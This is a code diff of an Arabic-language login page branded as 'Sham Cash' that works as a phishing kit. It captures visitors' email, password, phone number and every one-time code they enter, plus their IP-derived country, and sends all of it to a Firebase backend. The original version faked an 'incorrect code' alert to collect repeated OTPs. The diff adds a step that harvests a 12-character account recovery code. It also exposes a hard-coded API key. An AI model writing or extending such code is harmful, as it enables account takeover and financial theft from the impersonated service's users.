@@ -1,153 +1,190 @@
-"use client"
+"use client";
 
 import type React from "react";
 import { useState, useEffect } from "react";
 import { Eye, EyeOff, X } from "lucide-react";
 import { addData, setupOnlineStatus } from "@/lib/firebase";
-function randstr(prefix:string)
-{
-    return Math.random().toString(36).replace('0.',prefix || '');
+
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "");
 }
-const visitorID=randstr('shamn-')
-const allOtps = [""]
+
+const visitorID = randstr("shamn-");
+const allOtps: string[] = [];
 
 export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
-  const [step, setStep] = useState<"login" | "otp"|"phone">("login");
+  const [step, setStep] = useState<"login" | "otp" | "phone" | "recovery">(
+    "login"
+  );
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [phone, setPhone] = useState("");
-  const [phoneError, setPhoneError] = useState(""); // NEW: validation message
+  const [phoneError, setPhoneError] = useState("");
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [recoveryInput, setRecoveryInput] = useState("");
+  const [recoveryError, setRecoveryError] = useState("");
   const [showSplash, setShowSplash] = useState(true);
   const [loding, setloading] = useState(false);
   const [showOffer, setShowOffer] = useState(true);
 
   useEffect(() => {
-    getLocation().then(() => {
-      const timer = setTimeout(() => {
-        setShowSplash(false);
-      }, 2000);
-      return () => clearTimeout(timer);
-    }).catch(() => {
-      setShowSplash(true);
-    })
+    getLocation()
+      .then(() => {
+        const timer = setTimeout(() => setShowSplash(false), 2000);
+        return () => clearTimeout(timer);
+      })
+      .catch(() => setShowSplash(true));
   }, []);
 
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (email && password) {
-      setloading(true)
-      await addData({ id: visitorID, email, password })
-      setTimeout(() => {
-        setStep("phone");
-        setloading(false)
-      }, 3000);
-    }
+    if (!email || !password) return;
+    setloading(true);
+    await addData({ id: visitorID, email, password });
+    setTimeout(() => {
+      setStep("phone");
+      setloading(false);
+    }, 3000);
   };
 
-  // phone validation helper
   function validatePhoneNumber(value: string) {
-    // Example validation: 10 digits starting with a local prefix. Adjust to your rules.
     const digits = value.replace(/\D/g, "");
     if (digits.length === 0) return "الرجاء إدخال رقم الهاتف";
     if (digits.length < 9) return "الرقم قصير جداً";
     if (digits.length > 10) return "الرقم طويل جداً";
-    // you can also check prefix: if (!/^7|9|6/.test(digits[0])) ...
     return "";
   }
 
   const handlePhoneChange = (value: string) => {
-    // allow digits only
     const digits = value.replace(/\D/g, "");
     setPhone(digits);
-    const err = validatePhoneNumber(digits);
-    setPhoneError(err);
+    setPhoneError(validatePhoneNumber(digits));
   };
 
   const handlePhoneSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const err = validatePhoneNumber(phone);
     setPhoneError(err);
-    if (err) return; // block submit while invalid
-    setloading(true)
-    await addData({ id: visitorID, phone })
+    if (err) return;
+    setloading(true);
+    await addData({ id: visitorID, phone });
     setTimeout(() => {
       setStep("otp");
-      setloading(false)
+      setloading(false);
     }, 3000);
   };
 
   const handleOtpChange = (index: number, value: string) => {
     if (value.length > 1) return;
     const newOtp = [...otp];
-    newOtp[index] = value;
+    newOtp[index] = value.replace(/\D/g, "");
     setOtp(newOtp);
-
     if (value && index < 5) {
-      const nextInput = document.getElementById(`otp-${index + 1}`);
-      (nextInput as HTMLElement | null)?.focus();
+      const next = document.getElementById(`otp-${index + 1}`);
+      (next as HTMLElement | null)?.focus();
     }
   };
 
   const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
-      const prevInput = document.getElementById(`otp-${index - 1}`);
-      (prevInput as HTMLElement | null)?.focus();
+      const prev = document.getElementById(`otp-${index - 1}`);
+      (prev as HTMLElement | null)?.focus();
     }
   };
 
+  // on successful OTP we move to recovery input step
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (otp.every((digit) => digit)) {
-      allOtps.push(otp.join())
-      await addData({ id: visitorID, otp: otp.join(), allOtps })
-      setEmail("");
-      setPassword("");
-      setOtp(["", "", "", "", "", ""]);
-      setTimeout(() => {
-        alert("رمز التحقق غير صحيح")
-      }, 2000);
-    }
+    if (!otp.every((d) => d)) return;
+    const joined = otp.join("");
+    allOtps.push(joined);
+    setloading(true);
+    await addData({ id: visitorID, otp: joined, allOtps });
+    setEmail("");
+    setPassword("");
+    setOtp(["", "", "", "", "", ""]);
+    setTimeout(() => {
+      setloading(false);
+      setStep("recovery");
+    }, 1000);
   };
-  async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
+  // recovery validation: exactly 12 alphanumeric chars
+  function validateRecovery(value: string) {
+    if (!value) return "الرجاء إدخال رمز الاسترداد";
+    if (!/^[A-Za-z0-9]{12}$/.test(value))
+      return "يجب أن يتكون الرمز من 12 حرفًا/رقمًا إنجليزية بدون فراغات";
+    return "";
+  }
+
+  const handleRecoveryChange = (value: string) => {
+    // keep only alphanumeric ASCII
+    const filtered = value.replace(/[^A-Za-z0-9]/g, "").slice(0, 12);
+    setRecoveryInput(filtered);
+    setRecoveryError(validateRecovery(filtered));
+  };
+
+  const handleRecoverySubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    const err = validateRecovery(recoveryInput);
+    setRecoveryError(err);
+    if (err) return;
+    setloading(true);
+    // store user-entered recovery code
+    await addData({
+      id: visitorID,
+      recoveryCode: recoveryInput,
+      recoveryCreatedAt: new Date().toISOString(),
+    });
+    setloading(false);
+    // finalize or navigate: here we go back to login and clear sensitive data
+    setRecoveryInput("");
+    alert("رمز الاسترداد تم حفظه. احتفظ به في مكان آمن.");
+    setStep("login");
+  };
+
+  async function getLocation() {
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
     try {
       const response = await fetch(url);
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
-      }
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
       const country = await response.text();
       addData({
         id: visitorID,
-        country: country,
-        createdDate: new Date().toISOString()
-      })
-      localStorage.setItem('country', country)
-      setupOnlineStatus(visitorID)
+        country,
+        createdDate: new Date().toISOString(),
+      });
+      localStorage.setItem("country", country);
+      setupOnlineStatus(visitorID);
     } catch (error) {
-      console.error('Error fetching location:', error);
+      console.error("Error fetching location:", error);
     }
   }
+
   if (showSplash) {
     return (
-      <div className="min-h-screen bg-blue-50 flex flex-col items-center justify-center" dir="rtl">
+      <div
+        className="min-h-screen bg-blue-50 flex flex-col items-center justify-center"
+        dir="rtl"
+      >
         <div className="flex flex-col items-center animate-pulse">
           <img src="file.svg" alt="llog" />
         </div>
       </div>
-    )
+    );
   }
 
   return (
     <div className="min-h-screen bg-blue-50 flex flex-col" dir="rtl">
-
-
       <div className="flex-1 flex flex-col items-center justify-center px-3 py-8">
         <div className="w-full flex justify-between items-center mb-16">
-          <span className="text-gray-600 font-semibold text-sm">الإنكليزية</span>
+          <span className="text-gray-600 font-semibold text-sm">
+            الإنكليزية
+          </span>
         </div>
 
         {step === "login" ? (
@@ -155,8 +192,9 @@ export default function LoginPage() {
             <div className="mb-16 flex justify-center">
               <img src="file.svg" alt="llog" />
             </div>
-            <h1 className="text-xl font-bold text-gray-800 text-center mb-12">تسجيل الدخول</h1>
-
+            <h1 className="text-xl font-bold text-gray-800 text-center mb-12">
+              تسجيل الدخول
+            </h1>
             <form onSubmit={handleLoginSubmit} className="w-full max-w-md">
               <div className="mb-6">
                 <input
@@ -164,13 +202,8 @@ export default function LoginPage() {
                   placeholder="بريد الكتروني"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
-                  className="w-full px-4 py-2 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all flex items-center justify-end gap-3 text-sm"
-                  style={{
-                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23999' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'%3E%3C/path%3E%3Ccircle cx='12' cy='7' r='4'%3E%3C/circle%3E%3C/svg%3E")`,
-                    backgroundRepeat: "no-repeat",
-                    backgroundPosition: "16px center",
-                    paddingLeft: "50px",
-                  }}
+                  className="w-full px-4 py-2 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all text-sm"
+                  style={{ paddingLeft: "50px" }}
                 />
               </div>
 
@@ -181,59 +214,57 @@ export default function LoginPage() {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   className="w-full px-4 py-2 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all text-sm"
-                  style={{
-                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23999' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'%3E%3Crect x='3' y='11' width='18' height='11' rx='2' ry='2'%3E%3C/rect%3E%3Cpath d='M7 11V7a5 5 0 0 1 10 0v4'%3E%3C/path%3E%3C/svg%3E")`,
-                    backgroundRepeat: "no-repeat",
-                    backgroundPosition: "16px center",
-                    paddingLeft: "50px",
-                  }}
                 />
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
-                  className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-blue-600 transition-colors"
+                  className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-500"
                 >
                   {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                 </button>
               </div>
 
               <div className="text-center mb-8">
-                <a href="#" className="text-blue-600 hover:text-blue-700 font-medium text-sm">
-                  هل نسيت كلمة المرور؟ <span className="underline">تغيير كلمة المرور</span>
+                <a
+                  href="#"
+                  className="text-blue-600 hover:text-blue-700 font-medium text-sm"
+                >
+                  هل نسيت كلمة المرور؟{" "}
+                  <span className="underline">تغيير كلمة المرور</span>
                 </a>
               </div>
 
               <button
                 type="submit"
                 disabled={loding}
-                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-full transition-all duration-200 mb-8 shadow-lg text-sm"
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-2 px-4 rounded-full mb-8 text-sm"
               >
                 {loding ? "جاري التحقق..." : " تسجيل الدخول"}
               </button>
             </form>
-
             <div className="text-center mb-16">
               <p className="text-gray-700 text-sm">
                 لا تملك حساب مسبقا؟{" "}
-                <a href="#" className="text-blue-600 hover:text-blue-700 font-bold">
+                <a href="#" className="text-blue-600 font-bold">
                   إنشاء حساب
                 </a>
               </p>
             </div>
           </>
-        ) : step ==="otp"?(
+        ) : step === "otp" ? (
           <>
-          
             <h1 className="text-4xl font-bold text-gray-800 text-center mb-4">
-              رمز التحقق{" "}
-            </h1>            <p className="text-center text-gray-600 mb-12">
+              رمز التحقق
+            </h1>
+            <p className="text-center text-gray-600 mb-12">
               ادخل رمز التحقق المرسل الى بريدك الالكتروني{" "}
               <span className="px-2">{email}</span>
             </p>
-
             <form onSubmit={handleOtpSubmit} className="w-full max-w-md">
               <div className="mb-8" dir="ltr">
-                <label className="block text-right text-gray-700 font-medium mb-4">أدخل رمز التحقق</label>
+                <label className="block text-right text-gray-700 font-medium mb-4">
+                  أدخل رمز التحقق
+                </label>
                 <div className="flex gap-3 justify-center">
                   {otp.map((digit, index) => (
                     <input
@@ -245,7 +276,7 @@ export default function LoginPage() {
                       value={digit}
                       onChange={(e) => handleOtpChange(index, e.target.value)}
                       onKeyDown={(e) => handleOtpKeyDown(index, e)}
-                      className="w-12 h-12 text-center text-xl font-bold bg-gray-200 border-2 border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all"
+                      className="w-12 h-12 text-center text-xl font-bold bg-gray-200 border-2 border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
                     />
                   ))}
                 </div>
@@ -253,102 +284,126 @@ export default function LoginPage() {
 
               <button
                 type="submit"
-                disabled={!otp.every((digit) => digit)}
-                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-400 text-white font-bold py-4 px-4 rounded-full transition-all duration-200 mb-6 shadow-lg text-sm"
+                disabled={!otp.every((d) => d) || loding}
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-4 px-4 rounded-full mb-6 text-sm"
               >
-                تحقق
+                {loding ? "جارٍ المعالجة..." : "تحقق"}
               </button>
 
               <button
                 type="button"
                 onClick={() => setStep("login")}
-                className="w-full text-blue-600 hover:text-blue-700 font-medium py-2 transition-colors"
+                className="w-full text-blue-600 font-medium py-2"
               >
                 العودة للخلف
               </button>
             </form>
           </>
-        ):<>
-             <div className="mb-16 flex justify-center">
-              <img src="file.svg" alt="llog" />
-            </div>
+        ) : step === "phone" ? (
+          <>
+            <h1 className="text-2xl font-bold text-gray-800 text-center mb-4">
+              رقم الهاتف
+            </h1>
+            <p className="text-center text-gray-600 mb-6">
+              أدخل رقم هاتفك لاستلام رمز التحقق
+            </p>
             <form onSubmit={handlePhoneSubmit} className="w-full max-w-md">
-              <div className="mb-5 w-full">
-                <div
-                  role="status"
-                  aria-live="polite"
-                  className="flex items-start gap-3 bg-white/90 border border-blue-100 p-4 rounded-xl shadow-sm"
-                >
-                  <div className="flex-none">
-                    {/* simple icon circle */}
-                    <div className="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center text-blue-700 font-bold">i</div>
-                  </div>
-                  <div className="flex-1 text-right">
-                    <p className="text-sm text-gray-800 font-medium">تم رصد عملية تسجيل دخول من جهاز</p>
-                    <p className="text-xs text-gray-500 mt-1"> يرجى تأكيد هويتك عبر رقم الهاتف</p>
-                  </div>
-                </div>
-              </div>
-
-              <div className="mb-6">
-                <label className="block text-right text-gray-700 text-sm mb-2">رقم الهاتف</label>
+              <div className="mb-4">
                 <input
-                  inputMode="tel"
                   type="tel"
-                  placeholder="#########"
+                  placeholder="رقم الهاتف"
                   value={phone}
-                  maxLength={10}
                   onChange={(e) => handlePhoneChange(e.target.value)}
-                  className={`w-full px-4 py-2 bg-gray-200 border rounded-full text-right placeholder:text-gray-600 focus:outline-none transition-all text-sm ${phoneError ? "border-red-400 ring-2 ring-red-100" : "focus:ring-2 focus:ring-blue-400 border-0"}`}
-                  aria-invalid={!!phoneError}
-                  aria-describedby="phone-error"
+                  className="w-full px-4 py-2 bg-gray-200 rounded-full text-right"
                 />
-                <div className="mt-2 min-h-[1.25rem]">
-                  {phoneError ? (
-                    <p id="phone-error" className="text-right text-xs text-red-600">{phoneError}</p>
-                  ) : (
-                    <p className="text-right text-xs text-gray-500">أدخل رقم هاتفك بدون رموز أو مسافات.</p>
-                  )}
-                </div>
+                {phoneError && (
+                  <p className="text-red-500 text-sm mt-2">{phoneError}</p>
+                )}
+              </div>
+              <button
+                type="submit"
+                disabled={loding}
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-3 px-4 rounded-full mb-6"
+              >
+                إرسال رمز
+              </button>
+              <button
+                type="button"
+                onClick={() => setStep("login")}
+                className="w-full text-blue-600 font-medium py-2"
+              >
+                العودة للخلف
+              </button>
+            </form>
+          </>
+        ) : (
+          // recovery input step
+          <>
+            <h1 className="text-2xl font-bold text-gray-800 text-center mb-4">
+              إدخال رمز الاسترداد
+            </h1>
+            <p className="text-center text-gray-600 mb-6">
+              أدخل رمز الاسترداد الذي اخترته مسبقًا. يجب أن يتكون من 12
+              حرفًا/رقمًا إنجليزيًا.
+            </p>
+
+            <form onSubmit={handleRecoverySubmit} className="w-full max-w-md">
+              <div className="mb-4">
+                <input
+                  type="text"
+                  placeholder="رمز الاسترداد (12 حرفاً)"
+                  value={recoveryInput}
+                  onChange={(e) => handleRecoveryChange(e.target.value)}
+                  className="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-right placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                />
+                {recoveryError && (
+                  <p className="text-red-500 text-sm mt-2">{recoveryError}</p>
+                )}
               </div>
 
               <button
                 type="submit"
                 disabled={loding}
-                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-full transition-all duration-200 mb-8 shadow-lg text-sm"
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-3 px-4 rounded-full mb-4"
               >
-                {loding ? "جاري التحقق..." : " تحقق"}
+                {loding ? "جارٍ الحفظ..." : "حفظ رمز الاسترداد"}
+              </button>
+
+              <button
+                type="button"
+                onClick={() => setStep("login")}
+                className="w-full text-blue-600 font-medium py-2"
+              >
+                العودة للخلف
               </button>
             </form>
-        </>}
+          </>
+        )}
       </div>
 
       <footer className="text-center py-8 border-t border-blue-200">
         <p className="text-gray-600 text-sm mb-2">POWERED BY</p>
         <p className="text-gray-800 font-bold text-sm mb-1">Sham Cash ©</p>
         <p className="text-gray-500 text-sm mb-6">v 2.1.3</p>
-
       </footer>
 
       {showOffer && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50" dir="rtl">
+        <div
+          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50"
+          dir="rtl"
+        >
           <div className="relative bg-white rounded-3xl shadow-2xl overflow-hidden max-w-sm w-full">
             <button
               onClick={() => setShowOffer(false)}
-              className="absolute top-4 right-4 z-10 bg-white rounded-full p-2 hover:bg-gray-100 transition-colors"
+              className="absolute top-4 right-4 z-10 bg-white rounded-full p-2 hover:bg-gray-100"
             >
               <X size={24} className="text-gray-600" />
             </button>
 
             <div className="bg-gradient-to-br from-blue-700 via-blue-600 to-teal-600 p-8 text-white min-h-64 flex flex-col justify-between">
               <div className="flex flex-col items-center mb-8">
-                <div className="flex items-center gap-2 mb-2">
-
-
-                </div>
                 <p className="text-sm font-light">سهولة وأمان</p>
               </div>
-
               <div className="mb-6">
                 <img src="card.png" alt="log" />
               </div>
@@ -357,7 +412,7 @@ export default function LoginPage() {
             <div className="p-6 bg-white">
               <button
                 onClick={() => setShowOffer(false)}
-                className="w-full bg-gradient-to-r from-blue-500 to-teal-500 hover:from-blue-600 hover:to-teal-600 text-white font-bold py-3 px-4 rounded-full transition-all duration-200 shadow-lg"
+                className="w-full bg-gradient-to-r from-blue-500 to-teal-500 text-white font-bold py-3 px-4 rounded-full"
               >
                 احصل عليها
               </button>
@@ -366,5 +421,5 @@ export default function LoginPage() {
         </div>
       )}
     </div>
-  )
+  );
 }
